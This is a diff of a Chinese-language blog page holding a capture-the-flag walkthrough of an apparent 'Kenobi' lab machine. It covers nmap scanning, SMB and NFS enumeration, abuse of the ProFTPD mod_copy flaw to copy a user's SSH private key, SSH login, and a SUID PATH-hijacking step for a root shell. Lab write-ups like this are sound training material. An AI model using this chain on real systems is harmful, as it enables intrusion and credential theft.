@@ -6,31 +6,44 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="1.信息收集对目标进行端口扫描 sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173   对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息 sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173   2.SMB枚举SMB(Server Message Block)是一种在局域网">
+    <meta name="description" content="1.信息收集对目标进行端口扫描 sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173     对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息 sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173     2.SMB枚举SMB(Server Message Block)是一种">
 <meta property="og:type" content="article">
 <meta property="og:title" content="a">
 <meta property="og:url" content="http://mazige.top/2023/09/20/a/index.html">
 <meta property="og:site_name" content="智慧树乐园">
-<meta property="og:description" content="1.信息收集对目标进行端口扫描 sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173   对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息 sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173   2.SMB枚举SMB(Server Message Block)是一种在局域网">
+<meta property="og:description" content="1.信息收集对目标进行端口扫描 sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173     对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息 sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173     2.SMB枚举SMB(Server Message Block)是一种">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/1.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/1.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/2.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/2.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/3.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/3.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/4.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/4.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/5.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/5.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/6.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/6.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/7.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/7.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/8.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/8.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/9.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/9.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/10.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/10.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/11.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/11.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/12.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/12.png">
+<meta property="og:image" content="http://mazige.top/2023/09/20/a/13.png">
 <meta property="og:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/13.png">
 <meta property="article:published_time" content="2023-09-20T12:03:49.000Z">
-<meta property="article:modified_time" content="2023-09-20T15:31:07.857Z">
+<meta property="article:modified_time" content="2023-09-20T15:41:11.439Z">
 <meta property="article:author" content="马子哥">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://mazige.top/2023/09/20/a/Blog/source_posts/a/1.png">
+<meta name="twitter:image" content="http://mazige.top/2023/09/20/a/1.png">
     
     
       
@@ -167,15 +180,21 @@
     <h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>对目标进行端口扫描</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/1.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\1.png" alt="1"></p>
 <p>对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2023/09/20/a/2.png" class>
 
 <p><img src="/2023/09/20/a/Blog\source_posts\a\2.png" alt="2"></p>
 <h2 id="2-SMB枚举"><a href="#2-SMB枚举" class="headerlink" title="2.SMB枚举"></a>2.SMB枚举</h2><p>SMB(Server Message Block)是一种在局域网内共享文件和打印机的网络协议,主要用于Windows系统之间的数据交换,但也可以实现在不同系统间共享文件和资源</p>
 <p>通常来讲 SMB有两个端口：445 和 139 为TCP端口 同时也存在着UDP端口：137和138用于NetBIOS名称服务(NBNS)的UDP端口，用于SMB主机发现和名称解析 甚至一些系统会使用UDP代替TCP的445为SMB提供服务</p>
 <p>我们使用nmap来枚举SMB共享</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -p 445 --script&#x3D;smb-enum-shares.nse,smb-enum-users.nse 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2023/09/20/a/3.png" class>
 
 <p><img src="/2023/09/20/a/Blog\source_posts\a\3.png" alt="3"></p>
 <p>可以看到我们枚举到了3个SMB共享</p>
@@ -187,11 +206,15 @@
 <p>接着我们使用smbclient工具来访问名为anonymous的共享文件夹 </p>
 <pre class="line-numbers language-none"><code class="language-none">smbclient &#x2F;&#x2F;10.10.96.173&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/4.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\4.png" alt="4"></p>
 <p>匿名共享也可以使用以下命令递归下载</p>
 <pre class="line-numbers language-none"><code class="language-none">smbget -R smb:&#x2F;&#x2F;10.10.96.173&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>我们可以在此文件中看到为用户生成 SSH 密钥时 Kenobi 的信息以及有关 ProFTPD 服务器的信息</p>
+<img src="/2023/09/20/a/5.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\5.png" alt="5"></p>
 <p>可以知道FTP在21端口上运行</p>
 <p>于此同时在信息收集阶段 我们可以看到111端口在运行服务 rpcbind</p>
@@ -209,15 +232,21 @@
 <p>在本靶机中，我们可以使用nmp来枚举这一点</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -p 111 --script&#x3D;nfs-ls,nfs-statfs,nfs-showmount 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/6.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\6.png" alt="6"></p>
 <h2 id="3-获取基本权限"><a href="#3-获取基本权限" class="headerlink" title="3.获取基本权限"></a>3.获取基本权限</h2><p>在上述阶段中 我们得知ProFTPD 1.3.5在端口21上运行 同样的是我们也可以通过以下命令来确定</p>
 <pre class="line-numbers language-none"><code class="language-none">nc 10.10.96.173 21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2023/09/20/a/7.png" class>
 
 <p><img src="/2023/09/20/a/Blog\source_posts\a\7.png" alt="7"></p>
 <p>我们来寻找一下它存在的漏洞</p>
 <pre class="line-numbers language-none"><code class="language-none">searchsploit proftpd 1.3.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>Searchsploit 是一个用于 exploit-db.com 的命令行工具，我们可以用来查找特定软件版本的漏洞</p>
+<img src="/2023/09/20/a/8.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\8.png" alt="8"></p>
 <p>输出显示了 ProFTPD mod_copy模块的漏洞利用。该模块将允许我们使用它的 SITE CPFR 和 SITE CPTO 命令将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p>
 <p>在前面我们知道 FTP 服务以 Kenobi 用户身份运行，并为该用户生成一个 ssh 密钥。</p>
@@ -231,6 +260,8 @@ mount 10.10.96.173:&#x2F;var &#x2F;mnt&#x2F;kenobiNFS   &#x2F;&#x2F;把远程&#x
 mount 10.10.96.173：&#x2F;var &#x2F;mnt&#x2F;kenobiNFS   &#x2F;&#x2F;执行两次 确保挂载成功
 ls -la &#x2F;mnt&#x2F;kenobiNFS     &#x2F;&#x2F;查看挂载的远程共享目录 验证是否挂载成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/9.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\9.png" alt="9"></p>
 <p>接下来获得登录的私钥</p>
 <pre class="line-numbers language-none"><code class="language-none">cp &#x2F;mnt&#x2F;kenobiNFS&#x2F;tmp&#x2F;id_rsa . &#x2F;&#x2F;从远程复制文件到当前本地目录	
@@ -239,13 +270,19 @@ sudo chmod 600 id_rsa   &#x2F;&#x2F;更改权限为只有当前用户可读写<s
 <p>并通过ssh连接登录 并获取到我们的第一个flag</p>
 <pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa kenobi@10.10.96.173 &#x2F;&#x2F;-i 指定文件作为本次ssh连接的私钥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/10.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\10.png" alt="10"></p>
 <h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>这里我们使用PATH变量操作来提权</p>
 <pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<img src="/2023/09/20/a/11.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\11.png" alt="11"></p>
 <p>可以看出menu很不寻常</p>
 <p>我们执行一下</p>
+<img src="/2023/09/20/a/12.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\12.png" alt="12"></p>
 <p>由于此文件以根用户权限运行，我们可以操纵我们的路径获得根 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">cd &#x2F;tmp
@@ -254,6 +291,8 @@ chmod 777 curl
 export PATH&#x3D;&#x2F;tmp:$PATH  &#x2F;&#x2F;修改PATH变量,在原PATH变量前面添加&#x2F;tmp目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>当执行curl命令时,由于&#x2F;tmp目录在PATH中最优先,系统会先在&#x2F;tmp目录下查找curl命令,找到我们创建的curl文件,该文件内容其实是&#x2F;bin&#x2F;sh,所以会执行系统的&#x2F;bin&#x2F;sh程序。实现了将curl命令劫持到系统shell &#x2F;bin&#x2F;sh。</p>
+<img src="/2023/09/20/a/13.png" class>
+
 <p><img src="/2023/09/20/a/Blog\source_posts\a\13.png" alt="13"></p>
 <p>获取到我们的flag</p>
 
